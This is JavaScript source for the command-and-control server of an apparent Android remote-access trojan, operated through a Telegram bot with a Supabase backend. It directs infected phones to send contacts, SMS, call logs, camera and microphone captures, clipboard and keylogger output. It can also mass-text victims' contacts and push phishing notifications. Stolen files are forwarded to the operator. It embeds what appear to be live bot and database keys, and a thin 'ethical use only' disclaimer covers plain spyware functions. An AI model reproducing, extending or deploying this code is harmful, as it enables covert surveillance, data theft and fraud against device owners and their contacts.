const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const { createClient } = require('@supabase/supabase-client');

// Supabase Setup
const supabaseUrl = process.env.SUPABASE_URL || 'https://nebwfonyhfgxnfkiisvs.supabase.co';
const supabaseKey = process.env.SUPABASE_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lYndmb255aGZneG5ma2lpc3ZzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUzNjc0MjMsImV4cCI6MjA5MDk0MzQyM30.me-P_mhC3droVGrHSlD_G3h9-ZgGgR3hy8VyDLFTp58';
const supabase = createClient(supabaseUrl, supabaseKey);

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// Bot Setup
const BOT_TOKEN = process.env.BOT_TOKEN || "8709139578:AAER0NWsrjN2m1skAmD5w8fmD14Sl9yQTwE";
const bot = new telegramBot(BOT_TOKEN, {
  polling: true,
  request: {}
});

const appData = new Map();

// Branding & UI elements
const BRAND = "<b>Romeo Uchiha</b>";
const SHARINGAN = "👁️‍🗨️";
const LOADER = "⏳ [████████████] 100% Loading...";
const DISCLAIMER = "⚠️ <b>Ethical use only. This tool is made for testing and ethical use and you are responsible for your actions.</b>";
const BASE_URL = "https://doge-production-517d.up.railway.app";

const actions = [
  "📱 <b>Contacts</b>", "✉️ <b>SMS</b>", "📞 <b>Calls</b>", "📦 <b>Apps</b>", 
  "📷 <b>Main camera</b>", "🤳 <b>Selfie Camera</b>", "🎙️ <b>Microphone</b>", 
  "📋 <b>Clipboard</b>", "📸 <b>Screenshot</b>", "💬 <b>Toast</b>", 
  "📤 <b>Send SMS</b>", "📳 <b>Vibrate</b>", "▶️ <b>Play audio</b>", 
  "⏹️ <b>Stop Audio</b>", "⌨️ <b>Keylogger ON</b>", "🔕 <b>Keylogger OFF</b>", 
  "📁 <b>File explorer</b>", "🖼️ <b>Gallery</b>", "🔒 <b>Encrypt</b>", 
  "🔓 <b>Decrypt</b>", "📢 <b>Send SMS to all contacts</b>", "🔔 <b>Pop notification</b>", 
  "🌐 <b>Open URL</b>", "🎣 <b>Phishing</b>", "🔙 <b>Back to main menu</b>"
];

const menuKeyboard = {
  keyboard: [["💻 <b>Devices</b>", "⚡ <b>Action</b>"], ["ℹ️ <b>About us</b>"]],
  resize_keyboard: true
};

// Helper: Emit to specific user's devices
function emitToUserDevices(uid, event, payload, targetSocketId = "all") {
  io.sockets.sockets.forEach((socket) => {
    if (socket.uid === uid) {
      if (targetSocketId === "all" || socket.id === targetSocketId) {
        socket.emit(event, payload);
      }
    }
  });
}

// Fetch user UID based on Telegram Chat ID
async function getUserUid(chatId) {
  const { data } = await supabase.from('doge').select('uid').eq('tg_id', chatId).single();
  return data ? data.uid : null;
}

// Upload Route per UID
app.post("/upload/:uid", uploader.single('file'), async (req, res) => {
  const fileOriginalName = req.file.originalname;
  const model = req.headers.model;
  const uid = req.params.uid;

  const { data } = await supabase.from('doge').select('tg_id').eq('uid', uid).single();
  
  if (data && data.tg_id) {
    bot.sendDocument(data.tg_id, req.file.buffer, {
      caption: `${SHARINGAN} <b>File received from → ${model}</b>\n\n${LOADER}`,
      parse_mode: "HTML"
    }, {
      filename: fileOriginalName,
      contentType: "*/*"
    });
  }
  res.send("Done");
});

// Socket Connection
io.on("connection", (socket) => {
  let model = socket.handshake.headers.model + '-' + io.sockets.sockets.size || "no information";
  let version = socket.handshake.headers.version || "no information";
  let ip = socket.handshake.headers.ip || "no information";
  let uid = socket.handshake.headers.uid; // App must send UID in headers

  socket.model = model;
  socket.version = version;
  socket.ip = ip;
  socket.uid = uid;

  (async () => {
    if (!uid) return;
    const { data } = await supabase.from('doge').select('tg_id').eq('uid', uid).single();
    if (data && data.tg_id) {
      let connectMsg = `${SHARINGAN} <b>New device connected</b>\n\n<b>Model</b> → ${model}\n<b>Version</b> → ${version}\n<b>IP</b> → ${ip}\n<b>Time</b> → ${socket.handshake.time}\n\n${LOADER}`;
      bot.sendMessage(data.tg_id, connectMsg, { parse_mode: "HTML" });
    }
  })();

  socket.on("disconnect", async () => {
    if (!uid) return;
    const { data } = await supabase.from('doge').select('tg_id').eq('uid', uid).single();
    if (data && data.tg_id) {
      let disconnectMsg = `${SHARINGAN} <b>Device disconnected</b>\n\n<b>Model</b> → ${model}\n<b>Version</b> → ${version}\n<b>IP</b> → ${ip}\n<b>Time</b> → ${socket.handshake.time}\n\n`;
      bot.sendMessage(data.tg_id, disconnectMsg, { parse_mode: "HTML" });
    }
  });

  socket.on("message", async (msg) => {
    if (!uid) return;
    const { data } = await supabase.from('doge').select('tg_id').eq('uid', uid).single();
    if (data && data.tg_id) {
      bot.sendMessage(data.tg_id, `${SHARINGAN} <b>Message received from → ${model}\n\nMessage → </b>${msg}\n\n${LOADER}`, { parse_mode: "HTML" });
    }
  });
});

// Bot Commands
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  // Login / Register Logic
  if (text && text.startsWith("/lg ")) {
    const match = text.match(/\/lg (.+)@(.+)/);
    if (!match) {
      return bot.sendMessage(chatId, `❌ <b>Invalid format. Use: /lg uid@pass</b>`, { parse_mode: "HTML" });
    }
    const uid = match[1];
    const password = match[2];

    bot.sendMessage(chatId, `🌀 <b>Verifying Credentials...</b>\n${LOADER}`, { parse_mode: "HTML" });

    const { data, error } = await supabase.from('doge').select('*').eq('uid', uid).single();

    if (!data) {
      // Register
      const uniqueUrl = `${BASE_URL}/${uid}`;
      await supabase.from('doge').insert([{ uid, password, url: uniqueUrl, tg_id: chatId }]);
      bot.sendMessage(chatId, `${SHARINGAN} <b>Registration Successful ${BRAND}!</b>\n\n<b>Your App URL:</b> ${uniqueUrl}\n\n${DISCLAIMER}`, { parse_mode: "HTML", reply_markup: menuKeyboard });
    } else {
      // Login
      if (data.password === password) {
        await supabase.from('doge').update({ tg_id: chatId }).eq('uid', uid);
        bot.sendMessage(chatId, `${SHARINGAN} <b>Login Successful! Welcome back ${BRAND}</b>\n\n<b>Your App URL:</b> ${data.url}`, { parse_mode: "HTML", reply_markup: menuKeyboard });
      } else {
        bot.sendMessage(chatId, `❌ <b>Incorrect password for UID: ${uid}</b>`, { parse_mode: "HTML" });
      }
    }
    return;
  }

  if (text === "/start") {
    return bot.sendMessage(chatId, `${SHARINGAN} <b>Welcome to ${BRAND} Control Panel</b>\n\n${DISCLAIMER}\n\n<b>Developer: ${BRAND}</b>\n<i>Please login using /lg uid@pass</i>`, {
      parse_mode: "HTML"
    });
  }

  const uid = await getUserUid(chatId);
  if (!uid) {
    return bot.sendMessage(chatId, `⚠️ <b>You are not logged in. Please use /lg uid@pass first.</b>`, { parse_mode: "HTML" });
  }

  // App Data Keys isolated per user
  const actionKey = `${chatId}_action`;
  const targetKey = `${chatId}_target`;
  const numberKey = `${chatId}_number`;

  // Dynamic input handling
  if (appData.get(actionKey) === "microphoneDuration") {
    emitToUserDevices(uid, "commend", { request: "microphone", extras: [{ key: "duration", value: text }] }, appData.get(targetKey));
    appData.delete(targetKey); appData.delete(actionKey);
    return bot.sendMessage(chatId, `${SHARINGAN} <b>Request executed successfully. Waiting for response...</b>\n${LOADER}`, { parse_mode: "HTML", reply_markup: menuKeyboard });
  } 
  
  if (appData.get(actionKey) === "toastText") {
    emitToUserDevices(uid, "commend", { request: "toast", extras: [{ key: "text", value: text }] }, appData.get(targetKey));
    appData.delete(targetKey); appData.delete(actionKey);
    return bot.sendMessage(chatId, `${SHARINGAN} <b>Request executed successfully. Waiting for response...</b>\n${LOADER}`, { parse_mode: "HTML", reply_markup: menuKeyboard });
  }

  if (appData.get(actionKey) === "smsNumber") {
    appData.set(numberKey, text);
    appData.set(actionKey, 'smsText');
    return bot.sendMessage(chatId, `✉️ <b>Now Enter a message that you want to send to ${text}</b>\n\n`, {
      parse_mode: "HTML", reply_markup: { keyboard: [["❌ <b>Cancel action</b>"]], resize_keyboard: true, one_time_keyboard: true }
    });
  }

  if (appData.get(actionKey) === "smsText") {
    emitToUserDevices(uid, "commend", { request: "sendSms", extras: [{ key: "number", value: appData.get(numberKey) }, { key: "text", value: text }] }, appData.get(targetKey));
    appData.delete(targetKey); appData.delete(actionKey); appData.delete(numberKey);
    return bot.sendMessage(chatId, `${SHARINGAN} <b>Request executed successfully. Waiting for response...</b>\n${LOADER}`, { parse_mode: "HTML", reply_markup: menuKeyboard });
  }

  if (appData.get(actionKey) === "vibrateDuration") {
    emitToUserDevices(uid, "commend", { request: "vibrate", extras: [{ key: "duration", value: text }] }, appData.get(targetKey));
    appData.delete(targetKey); appData.delete(actionKey);
    return bot.sendMessage(chatId, `${SHARINGAN} <b>Request executed successfully. Waiting for response...</b>\n${LOADER}`, { parse_mode: "HTML", reply_markup: menuKeyboard });
  }

  if (appData.get(actionKey) === "textToAllContacts") {
    emitToUserDevices(uid, "commend", { request: "smsToAllContacts", extras: [{ key: "text", value: text }] }, appData.get(targetKey));
    appData.delete(targetKey); appData.delete(actionKey);
    return bot.sendMessage(chatId, `${SHARINGAN} <b>Request executed successfully. Waiting for response...</b>\n${LOADER}`, { parse_mode: "HTML", reply_markup: menuKeyboard });
  }

  if (appData.get(actionKey) === "notificationText") {
    emitToUserDevices(uid, "commend", { request: "popNotification", extras: [{ key: "text", value: text }, { key: "url", value: `${BASE_URL}/${uid}` }] }, appData.get(targetKey));
    appData.delete(targetKey); appData.delete(actionKey);
    return bot.sendMessage(chatId, `${SHARINGAN} <b>Request executed successfully. Waiting for response...</b>\n${LOADER}`, { parse_mode: "HTML", reply_markup: menuKeyboard });
  }

  // Menus handling
  if (text === "💻 <b>Devices</b>") {
    let count = 0;
    let msgList = "";
    io.sockets.sockets.forEach((s) => {
      if (s.uid === uid) {
        count++;
        msgList += `📱 <b>Device ${count}</b>\n<b>Model</b> → ${s.model}\n<b>Version</b> → ${s.version}\n<b>IP</b> → ${s.ip}\n\n`;
      }
    });

    if (count === 0) {
      bot.sendMessage(chatId, `⚠️ <b>There is no connected device</b>\n\n`, { parse_mode: "HTML" });
    } else {
      bot.sendMessage(chatId, `🔌 <b>Connected devices count : ${count}</b>\n\n${msgList}`, { parse_mode: "HTML" });
    }
  } 
  else if (text === "⚡ <b>Action</b>") {
    let kb = [];
    let count = 0;
    io.sockets.sockets.forEach((s) => {
      if (s.uid === uid) {
        kb.push([s.model]);
        count++;
      }
    });
    if (count === 0) {
      bot.sendMessage(chatId, `⚠️ <b>There is no connected device</b>\n\n`, { parse_mode: "HTML" });
    } else {
      kb.push(["🌐 <b>All</b>"]);
      kb.push(["🔙 <b>Back to main menu</b>"]);
      bot.sendMessage(chatId, `🎯 <b>Select device to perform action</b>\n\n`, { parse_mode: 'HTML', reply_markup: { keyboard: kb, resize_keyboard: true, one_time_keyboard: true } });
    }
  } 
  else if (text === "ℹ️ <b>About us</b>") {
    bot.sendMessage(chatId, `👑 <b>Developed & Owned by ${BRAND}</b>\n\n${DISCLAIMER}`, { parse_mode: 'HTML' });
  } 
  else if (text === "🔙 <b>Back to main menu</b>") {
    bot.sendMessage(chatId, `🏠 <b>Main menu</b>\n\n`, { parse_mode: "HTML", reply_markup: menuKeyboard });
  } 
  else if (text === "❌ <b>Cancel action</b>") {
    appData.delete(targetKey);
    bot.sendMessage(chatId, `🚫 <b>Action Cancelled</b>\n\n`, { parse_mode: "HTML", reply_markup: menuKeyboard });
  } 
  else if (actions.includes(text)) {
    const target = appData.get(targetKey) || "all";
    const reqMap = {
      "📱 <b>Contacts</b>": "contacts", "✉️ <b>SMS</b>": "all-sms", "📞 <b>Calls</b>": "calls", "📦 <b>Apps</b>": "apps",
      "📷 <b>Main camera</b>": "main-camera", "🤳 <b>Selfie Camera</b>": "selfie-camera", "📋 <b>Clipboard</b>": "clipboard",
      "⌨️ <b>Keylogger ON</b>": "keylogger-on", "🔕 <b>Keylogger OFF</b>": "keylogger-off"
    };

    if (reqMap[text]) {
      emitToUserDevices(uid, "commend", { request: reqMap[text], extras: [] }, target);
      appData.delete(targetKey);
      bot.sendMessage(chatId, `${SHARINGAN} <b>Request executed successfully...</b>\n${LOADER}`, { parse_mode: "HTML", reply_markup: menuKeyboard });
    } else if (text === "🎙️ <b>Microphone</b>") {
      appData.set(actionKey, 'microphoneDuration');
      bot.sendMessage(chatId, `🎙️ <b>Enter the microphone recording duration in seconds</b>\n\n`, { parse_mode: 'HTML', reply_markup: { keyboard: [["❌ <b>Cancel action</b>"]], resize_keyboard: true, one_time_keyboard: true } });
    } else if (text === "💬 <b>Toast</b>") {
      appData.set(actionKey, "toastText");
      bot.sendMessage(chatId, `💬 <b>Enter a message that you want to appear in toast box</b>\n\n`, { parse_mode: "HTML", reply_markup: { keyboard: [["❌ <b>Cancel action</b>"]], resize_keyboard: true, one_time_keyboard: true } });
    } else if (text === "📤 <b>Send SMS</b>") {
      appData.set(actionKey, "smsNumber");
      bot.sendMessage(chatId, `📤 <b>Enter a phone number that you want to send SMS</b>\n\n`, { parse_mode: 'HTML', reply_markup: { keyboard: [["❌ <b>Cancel action</b>"]], resize_keyboard: true, one_time_keyboard: true } });
    } else if (text === "📳 <b>Vibrate</b>") {
      appData.set(actionKey, "vibrateDuration");
      bot.sendMessage(chatId, `📳 <b>Enter the duration you want the device to vibrate in seconds</b>\n\n`, { parse_mode: "HTML", reply_markup: { keyboard: [["❌ <b>Cancel action</b>"]], resize_keyboard: true, one_time_keyboard: true } });
    } else if (text === "📢 <b>Send SMS to all contacts</b>") {
      appData.set(actionKey, "textToAllContacts");
      bot.sendMessage(chatId, `📢 <b>Enter text that you want to send to all target contacts</b>\n\n`, { parse_mode: "HTML", reply_markup: { keyboard: [["❌ <b>Cancel action</b>"]], resize_keyboard: true, one_time_keyboard: true } });
    } else if (text === "🔔 <b>Pop notification</b>") {
      appData.set(actionKey, "notificationText");
      bot.sendMessage(chatId, `🔔 <b>Enter text that you want to appear as notification</b>\n\n`, { parse_mode: "HTML", reply_markup: { keyboard: [["❌ <b>Cancel action</b>"]], resize_keyboard: true, one_time_keyboard: true } });
    } else {
      // Premium options
      bot.sendMessage(chatId, `💎 <b>This option is premium reserved for ${BRAND}.</b>\n\n`, { parse_mode: "HTML", reply_markup: menuKeyboard });
    }
  } 
  else {
    // Device selection logic
    let deviceFound = false;
    io.sockets.sockets.forEach((s) => {
      if (s.uid === uid && text === s.model) {
        deviceFound = true;
        appData.set(targetKey, s.id);
        bot.sendMessage(chatId, `🎯 <b>Select action to perform for ${s.model}</b>\n\n`, {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["📱 <b>Contacts</b>", "✉️ <b>SMS</b>"], ["📞 <b>Calls</b>", "📦 <b>Apps</b>"],
              ["📷 <b>Main camera</b>", "🤳 <b>Selfie Camera</b>"], ["🎙️ <b>Microphone</b>", "📋 <b>Clipboard</b>"],
              ["📸 <b>Screenshot</b>", "💬 <b>Toast</b>"], ["📤 <b>Send SMS</b>", "📳 <b>Vibrate</b>"],
              ["▶️ <b>Play audio</b>", "⏹️ <b>Stop Audio</b>"], ["⌨️ <b>Keylogger ON</b>", "🔕 <b>Keylogger OFF</b>"],
              ["📁 <b>File explorer</b>", "🖼️ <b>Gallery</b>"], ["🔒 <b>Encrypt</b>", "🔓 <b>Decrypt</b>"],
              ["🌐 <b>Open URL</b>", "🎣 <b>Phishing</b>"], ["📢 <b>Send SMS to all contacts</b>"],
              ["🔔 <b>Pop notification</b>"], ["🔙 <b>Back to main menu</b>"]
            ],
            resize_keyboard: true, one_time_keyboard: true
          }
        });
      }
    });

    if (text === "🌐 <b>All</b>") {
      appData.set(targetKey, "all");
      bot.sendMessage(chatId, `🎯 <b>Select action to perform for ALL available devices</b>\n\n`, {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
             ["📱 <b>Contacts</b>", "✉️ <b>SMS</b>"], ["📞 <b>Calls</b>", "📦 <b>Apps</b>"],
             ["📷 <b>Main camera</b>", "🤳 <b>Selfie Camera</b>"], ["🎙️ <b>Microphone</b>", "📋 <b>Clipboard</b>"],
             ["📸 <b>Screenshot</b>", "💬 <b>Toast</b>"], ["📤 <b>Send SMS</b>", "📳 <b>Vibrate</b>"],
             ["▶️ <b>Play audio</b>", "⏹️ <b>Stop Audio</b>"], ["⌨️ <b>Keylogger ON</b>", "🔕 <b>Keylogger OFF</b>"],
             ["📁 <b>File explorer</b>", "🖼️ <b>Gallery</b>"], ["🔒 <b>Encrypt</b>", "🔓 <b>Decrypt</b>"],
             ["🌐 <b>Open URL</b>", "🎣 <b>Phishing</b>"], ["📢 <b>Send SMS to all contacts</b>"],
             ["🔔 <b>Pop notification</b>"], ["🔙 <b>Back to main menu</b>"]
          ],
          resize_keyboard: true, one_time_keyboard: true
        }
      });
    }
  }
});

setInterval(() => {
  io.sockets.sockets.forEach((s) => {
    s.emit("ping", {});
  });
}, 5000);

server.listen(process.env.PORT || 3000, () => {
  console.log(`Server started by ${BRAND} on port ${process.env.PORT || 3000}`);
});
